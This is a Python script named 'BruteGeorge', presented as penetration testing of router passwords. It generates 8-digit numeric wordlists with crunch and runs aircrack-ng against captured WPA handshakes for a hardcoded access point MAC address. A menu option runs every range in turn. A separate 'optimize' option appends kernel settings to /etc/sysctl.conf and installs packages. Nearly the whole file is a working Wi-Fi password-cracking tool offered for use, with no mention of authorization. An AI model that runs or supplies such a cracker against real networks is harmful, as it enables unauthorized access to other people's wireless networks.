
import os, sys, time
from pathlib import Path #PATH LIBRARY

def optimizacion():
	os.system('clear')
	f = open("/etc/sysctl.conf", "a+")
	f.write("vm.swappiness = 10")
	f.write("\n")
	f.write("vm.vfs_cache_pressure = 50")
	f.write("\n")
	f.write("vm.watermark_scale_factor = 200")
	f.write("\n")
	f.write("vm.dirty_ratio = 3")
	f.close()
	os.system('sudo apt-get install initramfs-tools')
	os.system('sudo apt-get install preload')
	os.system('sudo preload on')
	
def main():

	menuselect = -1
	while menuselect != 10:

		os.system('clear')
		print("\n")
		print("  ****B***R****U****T****E*****G******E******O*******R*****G*****E****")
		print("\n")	
		print("  Penetration testing to 8 numbers passwords in modems/routers")
		print("  By Deckcard23")
		print("\n \n")
		print("  ***************** M E N U ***************  ")
		print("\n \n")
		print("  0. 00000000 to 11111111.")
		print("  1. 11111111 to 22222222.")
		print("  2. 22222222 to 33333333.")
		print("  3. 33333333 to 44444444.")
		print("  4. 44444444 to 55555555.")
		print("  5. 55555555 to 66666666.")
		print("  6. 66666666 to 77777777.")
		print("  7. 77777777 to 88888888.")
		print("  8. 88888888 to 99999999.")
		print("  9. OPTIMIZE YOUR COMPUTER.")
		print("  23. BRUTEGEORGE MODE.")
		print("  10. EXIT.")
	
	
			
		if menuselect != (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 23): 
			print("Choose any option:")
			
		try:
			menuselect = int(input("--->"))
		except ValueError:
        		print('PLease input a valid integer')
			
    	
		if menuselect == 23:
			dic0()
			dic1()
			dic2()
			dic3()
			dic4()
			dic5()
			dic6()
			dic7()
			dic8()
					
		if menuselect == 0:
			dic0()
			
		if menuselect == 1:
			dic1()
			
		if menuselect == 2:
			dic2()
			
		if menuselect == 3:
			dic3()
			
		if menuselect == 4:
			dic4()
			
		if menuselect == 5:
			dic5()
			
		if menuselect == 6:
			dic6()
			
		if menuselect == 7:
			dic7()
			
		if menuselect == 8:
			dic8()	
			
		if menuselect == 9:
			optimizacion()
#creacion de diccionario txt parcial

def dic0():

	anykey = input("Pulsa una tecla para empezar 00000000 a 11111111.")
	
	os.system('clear')
	os.system('crunch 8 8 -f /usr/share/crunch/charset.lst numeric -s 00000000 -e 11111111 -o Diccionario.txt')
#os.system('airolib-ng passwords-airolib --import passwd Diccionario.txt')
#os.system('airolib-ng passwords-airolib --import essid essid.lst')
#os.system('airolib-ng passwords-airolib --stats')
#os.system('airolib-ng passwords-airolib --clean all')
#os.system('airolib-ng passwords-airolib --batch')
#os.system('airolib-ng passwords-airolib --verify all')
#os.system('aircrack-ng *.cap -r passwords-airolib')
	os.system('aircrack-ng -a2 0C:80:63:36:B2:7E -w Diccionario.txt *.cap')

	anykey = input("Pulsa una tecla para continuar.")

def dic1():
	
	anykey = input("Pulsa una tecla para empezar 11111111 a 22222222.")

	os.system('clear')
	os.system('crunch 8 8 -f /usr/share/crunch/charset.lst numeric -s 11111111 -e 22222222 -o Diccionario.txt')
	os.system('aircrack-ng -a2 0C:80:63:36:B2:7E -w Diccionario.txt *.cap')

	anykey = input("Pulsa una tecla para continuar.")

def dic2():

	anykey = input("Pulsa una tecla para empezar 22222222 a 33333333.")

	os.system('clear')
	os.system('crunch 8 8 -f /usr/share/crunch/charset.lst numeric -s 22222222 -e 33333333 -o Diccionario.txt')
	os.system('aircrack-ng -a2 0C:80:63:36:B2:7E -w Diccionario.txt *.cap')

	anykey = input("Pulsa una tecla para continuar.")

def dic3():
	anykey = input("Pulsa una tecla para empezar 33333333 a 44444444.")

	os.system('clear')
	os.system('crunch 8 8 -f /usr/share/crunch/charset.lst numeric -s 33333333 -e 44444444 -o Diccionario.txt')
	os.system('aircrack-ng -a2 0C:80:63:36:B2:7E -w Diccionario.txt *.cap')

	anykey = input("Pulsa una tecla para continuar.")

def dic4():
	anykey = input("Pulsa una tecla para empezar 44444444 a 55555555.")

	os.system('clear')
	os.system('crunch 8 8 -f /usr/share/crunch/charset.lst numeric -s 44444444 -e 55555555 -o Diccionario.txt')
	os.system('aircrack-ng -a2 0C:80:63:36:B2:7E -w Diccionario.txt *.cap')

	anykey = input("Pulsa una tecla para continuar.")

def dic5():
	anykey = input("Pulsa una tecla para empezar 55555555 a 66666666.")

	os.system('clear')
	os.system('crunch 8 8 -f /usr/share/crunch/charset.lst numeric -s 55555555 -e 66666666 -o Diccionario.txt')
	os.system('aircrack-ng -a2 0C:80:63:36:B2:7E -w Diccionario.txt *.cap')

	anykey = input("Pulsa una tecla para continuar.")
	
def dic6():
	anykey = input("Pulsa una tecla para empezar 66666666 a 77777777.")

	os.system('clear')
	os.system('crunch 8 8 -f /usr/share/crunch/charset.lst numeric -s 66666666 -e 77777777 -o Diccionario.txt')
	os.system('aircrack-ng -a2 0C:80:63:36:B2:7E -w Diccionario.txt *.cap')

	anykey = input("Pulsa una tecla para continuar.")

def dic7():

	anykey = input("Pulsa una tecla para empezar 77777777 a 88888888.")

	os.system('clear')
	os.system('crunch 8 8 -f /usr/share/crunch/charset.lst numeric -s 77777777 -e 88888888 -o Diccionario.txt')
	os.system('aircrack-ng -a2 0C:80:63:36:B2:7E -w Diccionario.txt *.cap')

	anykey = input("Pulsa una tecla para continuar.")

def dic8():

	anykey = input("Pulsa una tecla para empezar 88888888 a 99999999.")

	os.system('clear')
	os.system('crunch 8 8 -f /usr/share/crunch/charset.lst numeric -s 88888888 -e 99999999 -o Diccionario.txt')
	os.system('aircrack-ng -a2 0C:80:63:36:B2:7E -w Diccionario.txt *.cap')

	anykey = input("Pulsa una tecla para continuar.")
	
main()
print("  THANKS TO USE BRUTEGEORGE.")
print("  FOLLOW ME ON TWITTER @RICKDECKARD23")
print("  OR IN THE WEBSITE DECKCARD23.COM")
